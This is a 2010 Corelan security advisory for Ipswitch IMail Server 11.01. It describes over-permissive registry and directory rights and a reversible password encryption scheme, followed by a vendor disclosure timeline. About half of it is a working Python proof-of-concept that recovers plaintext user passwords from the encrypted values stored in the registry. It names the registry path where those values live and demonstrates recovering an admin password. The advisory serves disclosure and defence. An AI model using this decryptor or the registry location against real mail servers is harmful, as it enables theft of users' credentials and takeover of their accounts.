@@ -1,0 +1,168 @@
+|------------------------------------------------------------------|
+|                         __               __                      |
+|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+|                                                                  |
+|                                       http://www.corelan.be:8800 |
+|                                                                  |
+|-------------------------------------------------[ EIP Hunters ]--|
+
+Advisory	: CORELAN-10-009
+Disclosure Date	: Feb 4th, 2010
+
+0x00 : Vulnerability Information
+
+	[+] Product  : IMail Server
+	[+] Version  : 11.01
+	[+] Vendor   : Ipswitch
+	[+] URL	     : http://www.ipswitch.com/
+	[+] Platform : Windows
+	[+] Issue fix: No
+	[+] Vulnerability discovered by: sinn3r
+	[+] Greetings to: Corelan Security Team::corelanc0d3r/EdiStrosar/Rick2600/MarkoT/mr_me/ekse/sinn3r/Jacky;
+			  and all the guys with secret identities at exploit-db.com  :-p
+	[+] Special thanks to: Jason from Ipswitch
+
+0x01 : Vendor Description of Software
+
+	"The Award-winning IMail Server is a proven email messaging solution for small and mid-sized businesses.
+	 Reliable, scalable and versatile, IMail Server is an affordable choice that meets the messaging needs
+	 of small and medium sized businesses. Unlike complicated and more expensive messaging solutions, IMail
+	 Server delivers a quick and easy installation. As a scalable, standards-based, email server with Webmail,
+	 optional integration with Microsoft Exchange ActiveSync®, SMTP, POP, IMAP, LDAP, and List Server, IMail
+	 users can send and receive email using any standards-based client, including Microsoft Outlook®,
+	 Outlook Express®, or Eudora®. Or, users can access email from anywhere via IMail's customizable Web
+	 messaging, available in eight languages.
+
+	 Designed to place minimal ongoing maintenance burden on network administrators, IMail can authenticate
+	 users from its own database, an active directory database, or from any ODBC-compliant data store, making
+	 life easier for the busy administrator. IMail Server also delivers a quick and easy installation or upgrade
+	 process."
+
+0x02 : Vulnerability Details
+
+	1. By default, IMail allows Internet Guest Account to have "Full Control" to the following registry key,
+	   including its subkeys and values. As well as the default IMail directory:
+		HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail
+		C:\Program Files\Ipswitch\IMail\
+
+	2. The IMail password decryption algorithm implemented in IMailsec.dll is also reversible.
+
+0x03 : Vendor Communication
+
+	1/21/2010 - IMail vendor contacted
+	1/26/2010 - Got a reply from the vendor (product development manager) for more vulnerability clarification.
+		    No fix yet.
+	2/02/2010 - Received another reply from the vendor: Issues logged for additional research.  No plans for
+		    immediate changes.  A public advisory was also suggested by the vendor as reference in their
+		    tech/KB article.
+	2/04/2010 - Public disclosure: Advisory created.  Vendor informed.
+
+0x04 : Exploit/Proof-of-Concept
+
+#!/usr/bin/python
+
+##########################################################################
+# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
+# Tested on: Windows XP SP3 (Windows version does not matter)
+# Description:
+# So I reverse engineered the IMail password decryption function in
+# IMailsec.dll, located at 0x00563130.
+#
+# In order to decrypt correctly, you must have the correct username,
+# because it is used as a key.
+#
+# All usernames and passwords are stored in registry, which can be
+# found at:
+# HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\[domain name]\Users
+# Every registry key under "Users" has a string value named "Password",
+# in there you'll find the encrypted password.
+#
+# By default, Internet Guest Account is granted with "Full Control" to
+# the IMail registry, and its directory.  That means if an attacker
+# manages to gain code execution (ie.via a web app bug), IMail can be
+# his/her next playground.  And IMail users may not be safe.
+#
+# Demo:
+# sinn3r@bt4:~$ ./iMailDecrypt.py admin C8D3D19AA094
+# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
+# coded by sinn3r  -  x90.sinner{at}gmail.c0m
+# [*] Password = god123
+#
+# Responsible Disclosure Timeline:
+# 1/21/2010  -  IMail vendor contacted
+# 1/26/2010  -  Got a reply from the vendor for more vulnerability
+#		clarfication.  No fix yet.
+# 2/02/2010  -  Received another reply from the vendor: Issues logged for
+#		additional research.  No plans for immediate changes.
+#		A public advisory was also suggested by the vendor as
+#		reference in their tech/KB article.
+# 2/04/2010  -  Public Disclosure.  Vendor informed again.
+##########################################################################
+
+import sys
+import binascii
+
+## Convert the encrypted string to integers for calculation
+## Returns the integer version as a list
+def convertToInt(data):
+	charset = []
+	for char in (data):
+		tmp = char.encode("hex")
+		tmp = int(tmp, 16)
+		charset.append(tmp)
+	return charset
+	
+
+## Decrypt the password
+## Returns the decrypted version as a list
+def decryptPassword(intUsername, intPassword):
+	results = []
+	counter = 0
+	counter2 = 0
+	pwdLength = len(intPassword)
+	while counter<pwdLength:
+		firstByte = intPassword[counter]
+		if firstByte <= 57:		#0x39
+			firstByte -= 48		#0x30
+		else:
+			firstByte -= 55		#0x37
+		firstByte *= 16			#SHL 0x40
+		secondByte = intPassword[counter+1]
+		if secondByte <= 57:		#0x39
+			secondByte -= 48	#0x30
+		else:
+			secondByte -= 55	#0x37
+		tmp = firstByte + secondByte
+
+		if len(intUsername) <= counter2:
+			counter2 = 0
+
+		if intUsername[counter2] > 54:			#0x41
+			if intUsername[counter2] < 90:		#5A
+				intUsername[counter2] += 32	#0x20
+
+		tmp -= intUsername[counter2]
+		counter2 += 1
+
+		results.append(hex(tmp)[2:])
+		counter += 2
+	return results
+
+banner = """Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
+coded by sinn3r  -  x90.sinner{at}gmail{d0t}c0m"""
+
+print banner
+
+if len(sys.argv) == 3:
+	if len(sys.argv[2]) % 2 == 0:
+		username = convertToInt(sys.argv[1])
+		password = convertToInt(sys.argv[2])
+		decryptor = str("".join(decryptPassword(username, password)))
+		print "[*] Password = %s" %binascii.unhexlify(decryptor)
+	else:
+		print "[*] Incorrect Encrypted password length"
+else:
+	print "[*] Usage: %s <username> <encrypted password>" %sys.argv[0]
